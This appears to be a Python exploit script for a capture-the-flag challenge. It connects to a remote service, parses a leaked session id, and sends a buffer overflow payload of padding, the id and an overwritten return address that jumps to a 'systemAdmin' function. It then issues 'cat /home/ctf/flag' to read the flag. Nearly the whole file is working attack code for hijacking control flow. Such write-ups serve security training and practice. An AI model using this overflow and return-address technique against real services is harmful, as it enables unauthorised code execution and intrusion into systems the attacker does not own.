import socket
import readline

host = '127.0.0.1'
port = 9000
host = '120.114.62.211'
port = 6128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

def recv(info=None):
  # TODO
  res = s.recv(4096)
  print(f'[<] {info if info else ""}')
  print(res.decode('ascii'))
  return res

def send(data):
  # TODO
  print(f'[>] Send: {data}')
  data = data + b'\n' if data[-1] != b'\n' else data
  s.send(data)

def interact():
  for _ in range(100):
    cmd = input('> ').encode('ascii')
    send(cmd)
    recv()

recv('Welcome')
res = recv('Id').decode('ascii')
my_id = int(res[res.find('id :')+4:res.find('\nPlease')])
print(f'[+] Id: {my_id}')

send(b'Alice')
recv('Requesting email')

payload  = b'A'*60
payload += my_id.to_bytes(4, 'little')
payload += b'B'*8
payload += (0x4007d6).to_bytes(8, 'little')  # addr of systemAdmin
send(payload)
# interact()

get_flag = b'cat /home/ctf/flag'
send(get_flag)
recv('Flag')

